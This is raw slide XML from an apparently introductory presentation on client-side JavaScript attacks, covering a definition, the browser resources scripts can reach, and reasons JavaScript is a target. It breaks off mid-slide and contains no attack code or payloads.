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Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
      <p:regular r:id="rId18"/>
      <p:bold r:id="rId19"/>
      <p:italic r:id="rId20"/>
      <p:boldItalic r:id="rId21"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Funnel Sans" panose="020B0604020202020204" charset="0"/>
      <p:regular r:id="rId22"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Mona Sans Semi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48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314801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JavaScript Attacks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="3947517"/>
            <a:ext cx="7556421" cy="1133951"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Understanding Client-Side JavaScript Vulnerabilities</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Picture 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{65B6CFDE-FA8C-10EF-8A80-61F13EFD183F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:srcRect l="46482" r="1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="9344722" y="0"/>
            <a:ext cx="5285678" cy="8229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02901"/>
            <a:ext cx="8573333"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1. What are JavaScript Attacks?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="2102406"/>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Definition</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="300954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JavaScript attacks are </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1750" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>client-side exploits</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> that leverage vulnerabilities in how web applications handle, execute, or trust JavaScript code. These attacks exploit the fact that JavaScript runs in the user's browser with access to:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="3990499"/>
            <a:ext cx="3090505" cy="1886188"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5051"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E2E4E9"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="C8CACF"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1028224" y="4224933"/>
            <a:ext cx="2621637" cy="708660"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Cookies and session tokens</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4111109" y="3990499"/>
            <a:ext cx="3090624" cy="1886188"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5051"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E2E4E9"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="C8CACF"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4345543" y="4224933"/>
            <a:ext cx="2621756" cy="708660"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Local storage and session storage</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7428548" y="3990499"/>
            <a:ext cx="3090624" cy="1886188"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5051"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E2E4E9"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="C8CACF"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7662982" y="4224933"/>
            <a:ext cx="2621756" cy="708660"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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DOM (Document Object Model)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10745986" y="3990499"/>
            <a:ext cx="3090624" cy="1886188"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5051"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E2E4E9"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="C8CACF"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10980420" y="4224933"/>
            <a:ext cx="2621756" cy="1417320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Browser APIs (geolocation, camera, microphone)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="6103501"/>
            <a:ext cx="6407944" cy="823198"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11573"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E2E4E9"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="C8CACF"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1028224" y="6337935"/>
            <a:ext cx="3699391"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User input and interactions</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7428548" y="6103501"/>
            <a:ext cx="6408063" cy="823198"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11573"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E2E4E9"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="C8CACF"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7662982" y="6337935"/>
            <a:ext cx="4850249"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Network requests (AJAX, Fetch API)</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542937" y="1301948"/>
            <a:ext cx="4381143" cy="432197"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Why JavaScript is a Target</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Image 0" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1595083" y="2511505"/>
            <a:ext cx="6085761" cy="3448526"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8973741" y="1944886"/>
            <a:ext cx="3121104" cy="691753"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2700"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>JavaScript Attack Surface</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8973741" y="2720935"/>
            <a:ext cx="3121104" cy="178118"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Key Reasons:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8973741" y="2993946"/>
            <a:ext cx="311229" cy="311229"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 18667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E2E4E9"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="C8CACF"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9025652" y="3019901"/>
            <a:ext cx="207407" cy="259318"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9369266" y="3041452"/>
            <a:ext cx="1729026" cy="216098"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1700"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Universal Execution</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9369266" y="3341846"/>
            <a:ext cx="2725579" cy="17811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JavaScript runs on every modern browser</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8973741" y="3688556"/>
            <a:ext cx="311229" cy="311229"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 18667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E2E4E9"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="C8CACF"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9025652" y="3714512"/>
            <a:ext cx="207407" cy="259318"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9369266" y="3736062"/>
            <a:ext cx="1729026" cy="216098"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1700"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Same-Origin Policy</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9369266" y="4036457"/>
            <a:ext cx="2725579" cy="17811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Malicious scripts inherit page privileges</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8973741" y="4383167"/>
            <a:ext cx="311229" cy="311229"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 18667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E2E4E9"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="C8CACF"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9025652" y="4409122"/>
            <a:ext cx="207407" cy="259318"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9369266" y="4430673"/>
            <a:ext cx="1729026" cy="216098"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1700"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Dynamic Nature</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9369266" y="4731068"/>
            <a:ext cx="2725579" cy="356235"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Code can be injected and executed at runtime</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8973741" y="5255895"/>
            <a:ext cx="311229" cy="311229"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 18667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E2E4E9"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="C8CACF"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9025652" y="5281851"/>
            <a:ext cx="207407" cy="259318"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9369266" y="5303401"/>
            <a:ext cx="1729026" cy="216098"/>
          </a:xfrm>
